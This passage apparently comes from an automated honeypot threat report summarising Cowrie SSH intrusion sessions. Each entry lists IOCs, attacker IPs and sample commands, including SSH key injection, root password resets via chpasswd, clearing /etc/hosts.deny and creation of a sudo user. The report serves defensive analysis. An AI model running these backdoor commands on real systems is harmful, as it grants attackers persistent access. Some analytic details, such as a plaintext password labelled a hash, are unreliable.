**Objective:** Gain persistent remote access to the host (SSH login) while collecting basic system information for reconnaissance.  

**Techniques & Tools:**
- Creation of `.ssh` directory and insertion of a public SSH key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...`) into `authorized_keys`.  
- Modification of permissions to restrict access (`chmod -R go= ~/.ssh`).  
- Setting a new UNIX password for user `ftpadmin` (via `passwd`).  
- System information gathering commands: `cat /proc/cpuinfo`, `free`, `ls`, `uname`, `top`, etc.  

**Indicators of Compromise (IOCs):**
- **IP:** 101.36.107.103 (Hong Kong)  
- **SSH Public Key:** `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- **Password strings:** `ftpadmin`, `pHPqzYzyCuKp` (used in `passwd`).  

**Threat Level:** Medium‑High – the attacker successfully installed a backdoor and performed system reconnaissance, enabling potential remote exploitation.  

**Brief Summary:** The attacker created an SSH key in the host’s `.ssh/authorized_keys` to establish a persistent backdoor, set user passwords, and collected basic system information for further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ftpadmin\npHPqzYzyCuKp\npHPqzYzyCuKp"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ftpadmin\npHPqzYzyCuKp\npHPqzYzyCuKp\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 4da444571d67...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.217.107

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain persistent remote access (via SSH) and elevate privileges to root.  
**Techniques:**  
- Injected a public‑key into `~/.ssh/authorized_keys` (SSH key injection).  
- Set root password (`chpasswd`).  
- Modified `/etc/hosts.deny` to block unwanted connections.  
- Gathered system information (`cpuinfo`, `free`, `lscpu`, `df`) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.217.107** (Singapore).  
- SSH public key string (the long RSA key in command 3).  
- File paths modified: `/etc/hosts.deny`, `~/.ssh`.  

**Threat Level:** **High** – root privilege escalation and persistent SSH access pose significant risk.  

**Brief Summary:** The attacker injected an SSH key, changed the root password, and gathered system details to establish a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:JSCbalp5k8Aj"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+9 more)
```

---

### Pattern: 331b16cbddb4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 85.185.120.213

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain remote SSH access and elevate privileges (root).  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `chmod`) and injection of a public key into `authorized_keys`.  
- Setting root password via `chpasswd`.  
- Killing potential malware processes (`secure.sh`, `auth.sh`, `sleep`).  
- System reconnaissance (CPU, memory, filesystem, crontab).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **85.185.120.213** (Iran)  
- SSH public key string in the command (the long RSA key).  
- File names targeted for removal or creation: `.ssh`, `secure.sh`, `auth.sh`.  

**Threat Level:** High – attacker successfully installs a backdoor and sets root credentials, enabling persistent remote control.  

**Brief Summary:** The session shows an attacker installing a SSH key and root password to establish a backdoor on the honeypot, while also attempting to clean up potential malware processes and gather system information.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:GLspyoFpZv9L"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c06c7bf5ccde...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 83.168.69.143

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection coupled with system reconnaissance.

**Objective:**  
Establish a persistent remote access point (SSH) and gather detailed system information to facilitate future exploitation or monitoring.

**Techniques & Tools Used:**
- Creation of `.ssh` directory, insertion of an RSA public key into `authorized_keys`.
- Permission manipulation (`chmod -R go= ~/.ssh`) to restrict access.
- Password changes via `passwd` (attempts to set a user password).
- System information queries (`/proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **83.168.69.143**  
- Public SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `.ssh/authorized_keys` (modified content).

**Threat Level:** Medium – the attacker successfully installed a backdoor and performed reconnaissance, indicating potential for future exploitation.

**Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `authorized_keys`, altered permissions, attempted password changes, and collected system information, setting up a remote access point for subsequent attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ftpadmin\nLMj05IGK7jjh\nLMj05IGK7jjh"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ftpadmin\nLMj05IGK7jjh\nLMj05IGK7jjh\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 762917b34a4c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.201.208

#### Analysis

**Attack Type:** Backdoor installation / remote access setup  
**Objective:** Gain persistent privileged access (root) via SSH and prepare the system for future exploitation.  
**Techniques:**  
- Injected a random RSA public key into `~/.ssh/authorized_keys` to enable SSH login.  
- Changed root password with `chpasswd`.  
- Deleted temporary scripts (`/tmp/secure.sh`, `/tmp/auth.sh`) and killed unrelated processes.  
- Created an empty `/etc/hosts.deny` file (potentially to bypass host-based restrictions).  
- Executed numerous system‑info commands for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.201.208**  
- RSA key string in `authorized_keys`: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File names: `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`  

**Threat Level:** **High** – attacker achieved root privileges and installed a backdoor, enabling persistent remote control.  

**Brief Summary:** The attacker injected an SSH key, changed the root password, and set up a backdoor on the system, preparing for future exploitation while gathering system information.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Oa1pENujoj28"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: ef931d7d4c85...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 83.168.69.143

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain persistent remote SSH access by adding a new RSA public key to the honeypot’s `authorized_keys` file.  
**Techniques:**  
- Manipulation of `.ssh` directory permissions (`chattr`, `lockr`) and creation of a new `.ssh` folder.  
- Injection of a random RSA key into `authorized_keys`.  
- Setting a new UNIX password via `passwd`.  
- System reconnaissance (CPU, memory, OS info).  

**Indicators of Compromise (IOCs):**  
- RSA public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  
- File modifications: `.ssh/authorized_keys`, `chmod -R go= ~/.ssh`.  

**Threat Level:** Medium – the attacker establishes a potential remote access point, but no additional malicious payload was detected.  

**Brief Summary:** The attacker injected a random SSH key into the honeypot’s authorized keys and altered directory permissions to enable persistent remote SSH access, while gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qaz@WSX\nJRZWfNnQVae8\nJRZWfNnQVae8"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qaz@WSX\nJRZWfNnQVae8\nJRZWfNnQVae8\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 9185c2570558...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 66.116.199.234

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain remote access via SSH while gathering system information.  
**Techniques:**  
- **SSH Key Injection** – created/modified `.ssh` directory, added a malicious RSA key to `authorized_keys`.  
- **Immutable File Attributes** – used `chattr -ia` and `lockr -ia` to prevent tampering.  
- **System Reconnaissance** – executed commands (`uname`, `top`, `lscpu`, `df`, `cat /proc/cpuinfo`, etc.) to collect CPU, memory, disk, and user data.  
- **Password Manipulation Attempt** – attempted to change the password for user “ftpadmin” via piped `passwd` input.  

**Indicators of Compromise (IOCs):**  
- IP: 66.116.199.234 (India)  
- RSA key string in `.ssh/authorized_keys`: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ftpadmin\nkz1n1qOBTWVF\nkz1n1qOBTWVF"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ftpadmin\nkz1n1qOBTWVF\nkz1n1qOBTWVF\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: caed19470010...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.36.107.103

#### Analysis

**Attack Type:**  
Backdoor installation / credential theft (root takeover)

**Objective:**  
Gain full control of the host by setting a new root password and inserting an SSH public‑key for remote access; potentially install malicious scripts (`secure.sh`, `auth.sh`) while gathering system information.

**Techniques & Tools Used:**
- **SSH key injection** – `echo … > ~/.ssh/authorized_keys`
- **Root password change** – `chpasswd` (via echo root:… | chpasswd)
- **Process termination** – `pkill -9` to kill suspicious processes (`sleep`, `secure.sh`, `auth.sh`)
- **System reconnaissance** – `cat /proc/cpuinfo`, `free -m`, `ls`, `uname`, `df`, etc.

**Indicators of Compromise (IOCs):**
- Attacker IP: 101.36.107.103
- Public key string in command 3 (`ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…`)
- Filenames referenced: `secure.sh`, `auth.sh`
- Commands to modify `/etc/hosts.deny` and kill processes

**Threat Level:** High – attacker achieved root access, injected SSH key for remote control, and attempted to hide or remove malicious scripts.

**Brief Summary:**  
The session shows an attacker attempting to take full control of the host by changing the root password, injecting a new SSH key, and potentially installing backdoor scripts while collecting system information.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:7e27IFzUln5j"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 3f796b1c87e0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.222.174

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain remote SSH access by injecting a malicious key and gather system details for further exploitation.  

**Techniques & Tools Used:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`) to secure the key file.  
- Creation of an RSA public key in `authorized_keys`.  
- Permission changes (`chmod -R go= ~/.ssh`).  
- System information gathering (`cat /proc/cpuinfo`, `uname`, `whoami`, `lscpu`, `df`).

**Indicators of Compromise (IOCs):**  
- RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  
- File path: `.ssh/authorized_keys`  
- Permission change command: `chmod -R go= ~/.ssh`

**Threat Level:** **High** – attacker successfully installs a backdoor and collects system data, enabling potential remote exploitation.

**Brief Summary:** The attacker injected a malicious SSH key into the honeypot’s `.ssh` directory, secured it with file attributes, and gathered system information to facilitate future remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ftpadmin\nisdkuT3Dbn8V\nisdkuT3Dbn8V"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ftpadmin\nisdkuT3Dbn8V\nisdkuT3Dbn8V\n"|passwd
uname -a
whoami
... (+2 more)
```

---

### Pattern: 584a45b8f5b8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 187.174.238.116

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged access to the host via SSH and root account.  
**Techniques:**  
- Injected a custom SSH public key into `~/.ssh/authorized_keys` (via `echo … > .ssh/authorized_keys`).  
- Changed permissions on `.ssh` (`chmod -R go= ~/.ssh`) to restrict access.  
- Reset the root password with `chpasswd`.  
- Killed suspicious processes and cleared `/etc/hosts.deny`.  
- Collected system information (CPU, memory, OS, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **187.174.238.116** (Mexico)  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password reset command: `echo "root:K8UhhlpttE8h"|chpasswd|bash`.  

**Threat Level:** **High** – the attacker successfully installed a backdoor and gained root access, posing significant risk.  

**Brief Summary:** The attacker injected an SSH key, reset the root password, and gathered system details to establish privileged access on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:K8UhhlpttE8h"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c67fc556c9db...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 96.44.159.120

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote access to the compromised host by adding a valid RSA key to `~/.ssh/authorized_keys` and attempting to change the local user’s password.  

**Techniques Used:**
- Creation of `.ssh` directory and setting restrictive permissions (`chmod go=`)
- Injection of an RSA public key into `authorized_keys`
- Attempted password changes via `passwd` (echoing passwords)
- System reconnaissance commands (`cpuinfo`, `free`, `uname`, `top`, etc.) to gather host details.

**Indicators of Compromise (IOCs):**
- Attacker IP: **96.44.159.120**  
- RSA key string in the authorized_keys file (the long base‑64 string) – can be hashed for detection.  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** **High** – the attacker has installed a backdoor that could allow remote SSH access, potentially compromising sensitive data or enabling further exploitation.

**Brief Summary:** The attacker injected an RSA key into the host’s SSH configuration and attempted to change the local password, establishing a potential remote backdoor for future control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qaz@WSX\n2T0EhDqrSgij\n2T0EhDqrSgij"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qaz@WSX\n2T0EhDqrSgij\n2T0EhDqrSgij\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: ca33e4a66f96...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.36.107.103

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Install an SSH key for future remote control and gather system information.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `chmod`) to secure the key file.  
- Injection of a public RSA key into `authorized_keys`.  
- Password change attempts via `passwd`.  
- System‑info gathering (`cpuinfo`, `free`, `ls`, `crontab`, `w`, `uname`, `top`, `whoami`, `lscpu`, `df`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.36.107.103**  
- RSA public key string in the `authorized_keys` file.  
- File path: `.ssh/authorized_keys`.  

**Threat Level:** Medium – the attacker establishes a backdoor and collects system data, but no immediate destructive payload was observed.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized_keys to enable future remote access while performing basic reconnaissance on the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qaz@WSX\nTaeLgyto99Ot\nTaeLgyto99Ot"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qaz@WSX\nTaeLgyto99Ot\nTaeLgyto99Ot\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 027c9571e2f1...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 96.44.159.120

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise – the attacker is attempting to gain privileged remote access.

**2. Objective:**  
Inject an SSH public‑key into `~/.ssh/authorized_keys` and reset the root password, thereby enabling persistent, high‑privilege access to the system.

**3. Techniques & Tools Used:**
- **SSH key injection** (`echo … > ~/.ssh/authorized_keys`)  
- **Root password change** (`chpasswd` with a new password)  
- **Permission manipulation** (`chmod -R go= ~/.ssh`, `chattr -ia .ssh`)  
- **Process killing & file removal** (`pkill -9 secure.sh`, `rm -rf /tmp/secure.sh`, etc.)  
- **System reconnaissance** (CPU info, memory usage, crontab, uname, top, whoami).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: 96.44.159.120  
- Public key string in `authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`) – can be hashed for detection.  
- No external URLs or domains.

**5. Threat Level:** High – the attacker has successfully installed a backdoor with root privileges, enabling full system control.

**6. Brief Summary:**  
The session shows an attacker injecting an SSH key and resetting the root password to establish a persistent, high‑privilege backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:9Ud0TpnwE66E"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 5e7d8da35478...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 179.43.184.242

#### Analysis

**Attack Type:** Backdoor installation (privileged user creation)  
**Objective:** Establish a new sudo‑enabled user (“system”) for later exploitation or botnet recruitment.  
**Techniques:**  
- `apt` package management (`sudo`, `curl`)  
- Linux user creation (`useradd`, `usermod`)  
- Password hashing via `openssl passwd -1`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **179.43.184.242** (Switzerland)  
- Command strings: `apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 V2YNh47q) system && sudo usermod -aG sudo system`  
- Password hash: **V2YNh47q**  

**Threat Level:** Medium – moderate sophistication, potential for future exploitation.  

**Brief Summary:** The attacker created a new privileged account on the honeypot, likely to facilitate subsequent unauthorized access or botnet activity.

#### Sample Commands
```
apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 V2YNh47q) system &&...
openssl passwd -1 V2YNh47q
openssl passwd -1 V2YNh47q
```

---

### Pattern: 8d2377b7066a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 66.116.199.234

#### Analysis

**Attack Type:** Backdoor installation / remote access via SSH  
**Objective:** Gain persistent root‑level access on the target system for future exploitation.  

**Techniques Used:**
- **SSH Key Injection** – creation of `.ssh/authorized_keys` with a hard‑coded RSA key.
- **Root Password Reset** – `chpasswd` to set a new root password (`root:L7DLrckXGKoW`).
- **Process Killing & System Modification** – removal of temporary scripts, killing processes, and clearing `/etc/hosts.deny`.
- **Reconnaissance** – gathering CPU/memory info (`cat /proc/cpuinfo`, `free -m`, `lscpu`) to profile the host.

**Indicators of Compromise (IOCs):**
- Attacker IP: 66.116.199.234  
